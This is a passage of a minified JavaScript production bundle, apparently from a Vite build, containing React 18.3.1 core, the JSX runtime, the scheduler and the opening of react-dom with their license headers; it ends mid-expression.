(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const o of document.querySelectorAll('link[rel="modulepreload"]'))r(o);new MutationObserver(o=>{for(const l of o)if(l.type==="childList")for(const i of l.addedNodes)i.tagName==="LINK"&&i.rel==="modulepreload"&&r(i)}).observe(document,{childList:!0,subtree:!0});function n(o){const l={};return o.integrity&&(l.integrity=o.integrity),o.referrerPolicy&&(l.referrerPolicy=o.referrerPolicy),o.crossOrigin==="use-credentials"?l.credentials="include":o.crossOrigin==="anonymous"?l.credentials="omit":l.credentials="same-origin",l}function r(o){if(o.ep)return;o.ep=!0;const l=n(o);fetch(o.href,l)}})();function ac(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var Gs={exports:{}},no={},Ks={exports:{}},M={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Qn=Symbol.for("react.element"),uc=Symbol.for("react.portal"),cc=Symbol.for("react.fragment"),dc=Symbol.for("react.strict_mode"),fc=Symbol.for("react.profiler"),pc=Symbol.for("react.provider"),mc=Symbol.for("react.context"),hc=Symbol.for("react.forward_ref"),gc=Symbol.for("react.suspense"),vc=Symbol.for("react.memo"),yc=Symbol.for("react.lazy"),Fi=Symbol.iterator;function Sc(e){return e===null||typeof e!="object"?null:(e=Fi&&e[Fi]||e["@@iterator"],typeof e=="function"?e:null)}var Qs={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},Xs=Object.assign,Ys={};function ln(e,t,n){this.props=e,this.context=t,this.refs=Ys,this.updater=n||Qs}ln.prototype.isReactComponent={};ln.prototype.setState=function(e,t){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")};ln.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function qs(){}qs.prototype=ln.prototype;function Bl(e,t,n){this.props=e,this.context=t,this.refs=Ys,this.updater=n||Qs}var Vl=Bl.prototype=new qs;Vl.constructor=Bl;Xs(Vl,ln.prototype);Vl.isPureReactComponent=!0;var zi=Array.isArray,Zs=Object.prototype.hasOwnProperty,bl={current:null},ea={key:!0,ref:!0,__self:!0,__source:!0};function ta(e,t,n){var r,o={},l=null,i=null;if(t!=null)for(r in t.ref!==void 0&&(i=t.ref),t.key!==void 0&&(l=""+t.key),t)Zs.call(t,r)&&!ea.hasOwnProperty(r)&&(o[r]=t[r]);var s=arguments.length-2;if(s===1)o.children=n;else if(1<s){for(var a=Array(s),c=0;c<s;c++)a[c]=arguments[c+2];o.children=a}if(e&&e.defaultProps)for(r in s=e.defaultProps,s)o[r]===void 0&&(o[r]=s[r]);return{$$typeof:Qn,type:e,key:l,ref:i,props:o,_owner:bl.current}}function wc(e,t){return{$$typeof:Qn,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}function Jl(e){return typeof e=="object"&&e!==null&&e.$$typeof===Qn}function kc(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(n){return t[n]})}var Hi=/\/+/g;function Co(e,t){return typeof e=="object"&&e!==null&&e.key!=null?kc(""+e.key):t.toString(36)}function Sr(e,t,n,r,o){var l=typeof e;(l==="undefined"||l==="boolean")&&(e=null);var i=!1;if(e===null)i=!0;else switch(l){case"string":case"number":i=!0;break;case"object":switch(e.$$typeof){case Qn:case uc:i=!0}}if(i)return i=e,o=o(i),e=r===""?"."+Co(i,0):r,zi(o)?(n="",e!=null&&(n=e.replace(Hi,"$&/")+"/"),Sr(o,t,n,"",function(c){return c})):o!=null&&(Jl(o)&&(o=wc(o,n+(!o.key||i&&i.key===o.key?"":(""+o.key).replace(Hi,"$&/")+"/")+e)),t.push(o)),1;if(i=0,r=r===""?".":r+":",zi(e))for(var s=0;s<e.length;s++){l=e[s];var a=r+Co(l,s);i+=Sr(l,t,n,a,o)}else if(a=Sc(e),typeof a=="function")for(e=a.call(e),s=0;!(l=e.next()).done;)l=l.value,a=r+Co(l,s++),i+=Sr(l,t,n,a,o);else if(l==="object")throw t=String(e),Error("Objects are not valid as a React child (found: "+(t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return i}function nr(e,t,n){if(e==null)return e;var r=[],o=0;return Sr(e,r,"","",function(l){return t.call(n,l,o++)}),r}function Cc(e){if(e._status===-1){var t=e._result;t=t(),t.then(function(n){(e._status===0||e._status===-1)&&(e._status=1,e._result=n)},function(n){(e._status===0||e._status===-1)&&(e._status=2,e._result=n)}),e._status===-1&&(e._status=0,e._result=t)}if(e._status===1)return e._result.default;throw e._result}var se={current:null},wr={transition:null},xc={ReactCurrentDispatcher:se,ReactCurrentBatchConfig:wr,ReactCurrentOwner:bl};function na(){throw Error("act(...) is not supported in production builds of React.")}M.Children={map:nr,forEach:function(e,t,n){nr(e,function(){t.apply(this,arguments)},n)},count:function(e){var t=0;return nr(e,function(){t++}),t},toArray:function(e){return nr(e,function(t){return t})||[]},only:function(e){if(!Jl(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};M.Component=ln;M.Fragment=cc;M.Profiler=fc;M.PureComponent=Bl;M.StrictMode=dc;M.Suspense=gc;M.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=xc;M.act=na;M.cloneElement=function(e,t,n){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var r=Xs({},e.props),o=e.key,l=e.ref,i=e._owner;if(t!=null){if(t.ref!==void 0&&(l=t.ref,i=bl.current),t.key!==void 0&&(o=""+t.key),e.type&&e.type.defaultProps)var s=e.type.defaultProps;for(a in t)Zs.call(t,a)&&!ea.hasOwnProperty(a)&&(r[a]=t[a]===void 0&&s!==void 0?s[a]:t[a])}var a=arguments.length-2;if(a===1)r.children=n;else if(1<a){s=Array(a);for(var c=0;c<a;c++)s[c]=arguments[c+2];r.children=s}return{$$typeof:Qn,type:e.type,key:o,ref:l,props:r,_owner:i}};M.createContext=function(e){return e={$$typeof:mc,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:pc,_context:e},e.Consumer=e};M.createElement=ta;M.createFactory=function(e){var t=ta.bind(null,e);return t.type=e,t};M.createRef=function(){return{current:null}};M.forwardRef=function(e){return{$$typeof:hc,render:e}};M.isValidElement=Jl;M.lazy=function(e){return{$$typeof:yc,_payload:{_status:-1,_result:e},_init:Cc}};M.memo=function(e,t){return{$$typeof:vc,type:e,compare:t===void 0?null:t}};M.startTransition=function(e){var t=wr.transition;wr.transition={};try{e()}finally{wr.transition=t}};M.unstable_act=na;M.useCallback=function(e,t){return se.current.useCallback(e,t)};M.useContext=function(e){return se.current.useContext(e)};M.useDebugValue=function(){};M.useDeferredValue=function(e){return se.current.useDeferredValue(e)};M.useEffect=function(e,t){return se.current.useEffect(e,t)};M.useId=function(){return se.current.useId()};M.useImperativeHandle=function(e,t,n){return se.current.useImperativeHandle(e,t,n)};M.useInsertionEffect=function(e,t){return se.current.useInsertionEffect(e,t)};M.useLayoutEffect=function(e,t){return se.current.useLayoutEffect(e,t)};M.useMemo=function(e,t){return se.current.useMemo(e,t)};M.useReducer=function(e,t,n){return se.current.useReducer(e,t,n)};M.useRef=function(e){return se.current.useRef(e)};M.useState=function(e){return se.current.useState(e)};M.useSyncExternalStore=function(e,t,n){return se.current.useSyncExternalStore(e,t,n)};M.useTransition=function(){return se.current.useTransition()};M.version="18.3.1";Ks.exports=M;var ce=Ks.exports;const Tc=ac(ce);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Ec=ce,Pc=Symbol.for("react.element"),jc=Symbol.for("react.fragment"),Rc=Object.prototype.hasOwnProperty,Nc=Ec.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Mc={key:!0,ref:!0,__self:!0,__source:!0};function ra(e,t,n){var r,o={},l=null,i=null;n!==void 0&&(l=""+n),t.key!==void 0&&(l=""+t.key),t.ref!==void 0&&(i=t.ref);for(r in t)Rc.call(t,r)&&!Mc.hasOwnProperty(r)&&(o[r]=t[r]);if(e&&e.defaultProps)for(r in t=e.defaultProps,t)o[r]===void 0&&(o[r]=t[r]);return{$$typeof:Pc,type:e,key:l,ref:i,props:o,_owner:Nc.current}}no.Fragment=jc;no.jsx=ra;no.jsxs=ra;Gs.exports=no;var g=Gs.exports,Ko={},oa={exports:{}},Se={},la={exports:{}},ia={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function t(T,R){var N=T.length;T.push(R);e:for(;0<N;){var b=N-1>>>1,Q=T[b];if(0<o(Q,R))T[b]=R,T[N]=Q,N=b;else break e}}function n(T){return T.length===0?null:T[0]}function r(T){if(T.length===0)return null;var R=T[0],N=T.pop();if(N!==R){T[0]=N;e:for(var b=0,Q=T.length,er=Q>>>1;b<er;){var vt=2*(b+1)-1,ko=T[vt],yt=vt+1,tr=T[yt];if(0>o(ko,N))yt<Q&&0>o(tr,ko)?(T[b]=tr,T[yt]=N,b=yt):(T[b]=ko,T[vt]=N,b=vt);else if(yt<Q&&0>o(tr,N))T[b]=tr,T[yt]=N,b=yt;else break e}}return R}function o(T,R){var N=T.sortIndex-R.sortIndex;return N!==0?N:T.id-R.id}if(typeof performance=="object"&&typeof performance.now=="function"){var l=performance;e.unstable_now=function(){return l.now()}}else{var i=Date,s=i.now();e.unstable_now=function(){return i.now()-s}}var a=[],c=[],f=1,m=null,h=3,S=!1,w=!1,k=!1,F=typeof setTimeout=="function"?setTimeout:null,d=typeof clearTimeout=="function"?clearTimeout:null,u=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function p(T){for(var R=n(c);R!==null;){if(R.callback===null)r(c);else if(R.startTime<=T)r(c),R.sortIndex=R.expirationTime,t(a,R);else break;R=n(c)}}function v(T){if(k=!1,p(T),!w)if(n(a)!==null)w=!0,So(x);else{var R=n(c);R!==null&&wo(v,R.startTime-T)}}function x(T,R){w=!1,k&&(k=!1,d(j),j=-1),S=!0;var N=h;try{for(p(R),m=n(a);m!==null&&(!(m.expirationTime>R)||T&&!je());){var b=m.callback;if(typeof b=="function"){m.callback=null,h=m.priorityLevel;var Q=b(m.expirationTime<=R);R=e.unstable_now(),typeof Q=="function"?m.callback=Q:m===n(a)&&r(a),p(R)}else r(a);m=n(a)}if(m!==null)var er=!0;else{var vt=n(c);vt!==null&&wo(v,vt.startTime-R),er=!1}return er}finally{m=null,h=N,S=!1}}var E=!1,P=null,j=-1,V=5,O=-1;function je(){return!(e.unstable_now()-O<V)}function un(){if(P!==null){var T=e.unstable_now();O=T;var R=!0;try{R=P(!0,T)}finally{R?cn():(E=!1,P=null)}}else E=!1}var cn;if(typeof u=="function")cn=function(){u(un)};else if(typeof MessageChannel<"u"){var _i=new MessageChannel,sc=_i.port2;_i.port1.onmessage=un,cn=function(){sc.postMessage(null)}}else cn=function(){F(un,0)};function So(T){P=T,E||(E=!0,cn())}function wo(T,R){j=F(function(){T(e.unstable_now())},R)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(T){T.callback=null},e.unstable_continueExecution=function(){w||S||(w=!0,So(x))},e.unstable_forceFrameRate=function(T){0>T||125<T?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):V=0<T?Math.floor(1e3/T):5},e.unstable_getCurrentPriorityLevel=function(){return h},e.unstable_getFirstCallbackNode=function(){return n(a)},e.unstable_next=function(T){switch(h){case 1:case 2:case 3:var R=3;break;default:R=h}var N=h;h=R;try{return T()}finally{h=N}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(T,R){switch(T){case 1:case 2:case 3:case 4:case 5:break;default:T=3}var N=h;h=T;try{return R()}finally{h=N}},e.unstable_scheduleCallback=function(T,R,N){var b=e.unstable_now();switch(typeof N=="object"&&N!==null?(N=N.delay,N=typeof N=="number"&&0<N?b+N:b):N=b,T){case 1:var Q=-1;break;case 2:Q=250;break;case 5:Q=1073741823;break;case 4:Q=1e4;break;default:Q=5e3}return Q=N+Q,T={id:f++,callback:R,priorityLevel:T,startTime:N,expirationTime:Q,sortIndex:-1},N>b?(T.sortIndex=N,t(c,T),n(a)===null&&T===n(c)&&(k?(d(j),j=-1):k=!0,wo(v,N-b))):(T.sortIndex=Q,t(a,T),w||S||(w=!0,So(x))),T},e.unstable_shouldYield=je,e.unstable_wrapCallback=function(T){var R=h;return function(){var N=h;h=R;try{return T.apply(this,arguments)}finally{h=N}}}})(ia);la.exports=ia;var Oc=la.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Lc=ce,ye=Oc;function y(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var sa=new Set,Ln={};function Ot(e,t){qt(e,t),qt(e+"Capture",t)}function qt(e,t){for(Ln[e]=t,e=0;e<t.length;e++)sa.add(t[e])}var Je=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Qo=Object.prototype.hasOwnProperty,Dc=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Ui={},Wi={};function Ic(e){return Qo.call(Wi,e)?!0:Qo.call(Ui,e)?!1:Dc.test(e)?Wi[e]=!0:(Ui[e]=!0,!1)}function Ac(e,t,n,r){if(n!==null&&n.type===0)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return r?!1:n!==null?!n.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function _c(e,t,n,r){if(t===null||typeof t>"u"||Ac(e,t,n,r))return!0;if(r)return!1;if(n!==null)switch(n.type){case 3:return!t;case 4:return t===!1;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}function ae(e,t,n,r,o,l,i){this.acceptsBooleans=t===2||t===3||t===4,this.attributeName=r,this.attributeNamespace=o,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=l,this.removeEmptyString=i}var ee={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){ee[e]=new ae(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];ee[t]=new ae(t,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){ee[e]=new ae(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){ee[e]=new ae(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){ee[e]=new ae(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){ee[e]=new ae(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){ee[e]=new ae(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){ee[e]=new ae(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){ee[e]=new ae(e,5,!1,e.toLowerCase(),null,!1,!1)});var $l=/[\-:]([a-z])/g;function Gl(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace($l,Gl);ee[t]=new ae(t,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace($l,Gl);ee[t]=new ae(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace($l,Gl);ee[t]=new ae(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){ee[e]=new ae(e,1,!1,e.toLowerCase(),null,!1,!1)});ee.xlinkHref=new ae("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){ee[e]=new ae(e,1,!1,e.toLowerCase(),null,!0,!0)});function Kl(e,t,n,r){var o=ee.hasOwnProperty(t)?ee[t]:null;(o!==null?o.type!==0:r||!(2<t.length)||t[0]!=="o"&&t[0]!=="O"||t[1]!=="n"&&t[1]!=="N")&&(_c(t,n,o,r)&&(n=null),r||o===null?Ic(t)&&(n===null?e.removeAttribute(t):e.setAttribute(t,""+n)):o.mustUseProperty?e[o.propertyName]=n===null?o.type===3?!1:"":n:(t=o.attributeName,r=o.attributeNamespace,n===null?e.removeAttribute(t):(o=o.type,n=o===3||o===4&&n===!0?"":""+n,r?e.setAttributeNS(r,t,n):e.setAttribute(t,n))))}var Qe=Lc.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,rr=Symbol.for("react.element"),It=Symbol.for("react.portal"),At=Symbol.for("react.fragment"),Ql=Symbol.for("react.strict_mode"),Xo=Symbol.for("react.profiler"),aa=Symbol.for("react.provider"),ua=Symbol.for("react.context"),Xl=Symbol.for("react.forward_ref"),Yo=Symbol.for("react.suspense"),qo=Symbol.for("react.suspense_list"),Yl=Symbol.for("react.memo"),qe=Symbol.for("react.lazy"),ca=Symbol.for("react.offscreen"),Bi=Symbol.iterator;function dn(e){return e===null||typeof e!="object"?null:(e=Bi&&e[Bi]||e["@@iterator"],typeof e=="function"?e:null)}var W=Object.assign,xo;function Sn(e){if(xo===void 0)try{throw Error()}catch(n){var t=n.stack.trim().match(/\n( *(at )?)/);xo=t&&t[1]||""}return`
`+xo+e}var To=!1;function Eo(e,t){if(!e||To)return"";To=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(t,[])}catch(c){var r=c}Reflect.construct(e,[],t)}else{try{t.call()}catch(c){r=c}e.call(t.prototype)}else{try{throw Error()}catch(c){r=c}e()}}catch(c){if(c&&r&&typeof c.stack=="string"){for(var o=c.stack.split(`
`),l=r.stack.split(`
`),i=o.length-1,s=l.length-1;1<=i&&0<=s&&o[i]!==l[s];)s--;for(;1<=i&&0<=s;i--,s--)if(o[i]!==l[s]){if(i!==1||s!==1)do if(i--,s--,0>s||o[i]!==l[s]){var a=`
`+o[i].replace(" at new "," at ");return e.displayName&&a.includes("<anonymous>")&&(a=a.replace("<anonymous>",e.displayName)),a}while(1<=i&&0<=s);break}}}finally{To=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?Sn(e):""}function Fc(e){switch(e.tag){case 5:return Sn(e.type);case 16:return Sn("Lazy");case 13:return Sn("Suspense");case 19:return Sn("SuspenseList");case 0:case 2:case 15:return e=Eo(e.type,!1),e;case 11:return e=Eo(e.type.render,!1),e;case 1:return e=Eo(e.type,!0),e;default:return""}}function Zo(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case At:return"Fragment";case It:return"Portal";case Xo:return"Profiler";case Ql:return"StrictMode";case Yo:return"Suspense";case qo:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case ua:return(e.displayName||"Context")+".Consumer";case aa:return(e._context.displayName||"Context")+".Provider";case Xl:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Yl:return t=e.displayName||null,t!==null?t:Zo(e.type)||"Memo";case qe:t=e._payload,e=e._init;try{return Zo(e(t))}catch{}}return null}function zc(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=t.render,e=e.displayName||e.name||"",t.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return Zo(t);case 8:return t===Ql?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t}return null}function ft(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function da(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function Hc(e){var t=da(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),r=""+e[t];if(!e.hasOwnProperty(t)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var o=n.get,l=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return o.call(this)},set:function(i){r=""+i,l.call(this,i)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(i){r=""+i},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function or(e){e._valueTracker||(e._valueTracker=Hc(e))}function fa(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r="";return e&&(r=da(e)?e.checked?"true":"false":e.value),e=r,e!==n?(t.setValue(e),!0):!1}function Or(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function el(e,t){var n=t.checked;return W({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??e._wrapperState.initialChecked})}function Vi(e,t){var n=t.defaultValue==null?"":t.defaultValue,r=t.checked!=null?t.checked:t.defaultChecked;n=ft(t.value!=null?t.value:n),e._wrapperState={initialChecked:r,initialValue:n,controlled:t.type==="checkbox"||t.type==="radio"?t.checked!=null:t.value!=null}}function pa(e,t){t=t.checked,t!=null&&Kl(e,"checked",t,!1)}function tl(e,t){pa(e,t);var n=ft(t.value),r=t.type;if(n!=null)r==="number"?(n===0&&e.value===""||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if(r==="submit"||r==="reset"){e.removeAttribute("value");return}t.hasOwnProperty("value")?nl(e,t.type,n):t.hasOwnProperty("defaultValue")&&nl(e,t.type,ft(t.defaultValue)),t.checked==null&&t.defaultChecked!=null&&(e.defaultChecked=!!t.defaultChecked)}function bi(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var r=t.type;if(!(r!=="submit"&&r!=="reset"||t.value!==void 0&&t.value!==null))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}n=e.name,n!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,n!==""&&(e.name=n)}function nl(e,t,n){(t!=="number"||Or(e.ownerDocument)!==e)&&(n==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var wn=Array.isArray;function $t(e,t,n,r){if(e=e.options,t){t={};for(var o=0;o<n.length;o++)t["$"+n[o]]=!0;for(n=0;n<e.length;n++)o=t.hasOwnProperty("$"+e[n].value),e[n].selected!==o&&(e[n].selected=o),o&&r&&(e[n].defaultSelected=!0)}else{for(n=""+ft(n),t=null,o=0;o<e.length;o++){if(e[o].value===n){e[o].selected=!0,r&&(e[o].defaultSelected=!0);return}t!==null||e[o].disabled||(t=e[o])}t!==null&&(t.selected=!0)}}function rl(e,t){if(t.dangerouslySetInnerHTML!=null)throw Error(y(91));return W({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Ji(e,t){var n=t.value;if(n==null){if(n=t.children,t=t.defaultValue,n!=null){if(t!=null)throw Error(y(92));if(wn(n)){if(1<n.length)throw Error(y(93));n=n[0]}t=n}t==null&&(t=""),n=t}e._wrapperState={initialValue:ft(n)}}function ma(e,t){var n=ft(t.value),r=ft(t.defaultValue);n!=null&&(n=""+n,n!==e.value&&(e.value=n),t.defaultValue==null&&e.defaultValue!==n&&(e.defaultValue=n)),r!=null&&(e.defaultValue=""+r)}function $i(e){var t=e.textContent;t===e._wrapperState.initialValue&&t!==""&&t!==null&&(e.value=t)}function ha(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function ol(e,t){return e==null||e==="http://www.w3.org/1999/xhtml"?ha(t):e==="http://www.w3.org/2000/svg"&&t==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var lr,ga=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(t,n,r,o){MSApp.execUnsafeLocalFunction(function(){return e(t,n,r,o)})}:e}(function(e,t){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=t;else{for(lr=lr||document.createElement("div"),lr.innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=lr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function Dn(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&n.nodeType===3){n.nodeValue=t;return}}e.textContent=t}var xn={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Uc=["Webkit","ms","Moz","O"];Object.keys(xn).forEach(function(e){Uc.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),xn[t]=xn[e]})});function va(e,t,n){return t==null||typeof t=="boolean"||t===""?"":n||typeof t!="number"||t===0||xn.hasOwnProperty(e)&&xn[e]?(""+t).trim():t+"px"}function ya(e,t){e=e.style;for(var n in t)if(t.hasOwnProperty(n)){var r=n.indexOf("--")===0,o=va(n,t[n],r);n==="float"&&(n="cssFloat"),r?e.setProperty(n,o):e[n]=o}}var Wc=W({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ll(e,t){if(t){if(Wc[e]&&(t.children!=null||t.dangerouslySetInnerHTML!=null))throw Error(y(137,e));if(t.dangerouslySetInnerHTML!=null){if(t.children!=null)throw Error(y(60));if(typeof t.dangerouslySetInnerHTML!="object"||!("__html"in t.dangerouslySetInnerHTML))throw Error(y(61))}if(t.style!=null&&typeof t.style!="object")throw Error(y(62))}}function il(e,t){if(e.indexOf("-")===-1)return typeof 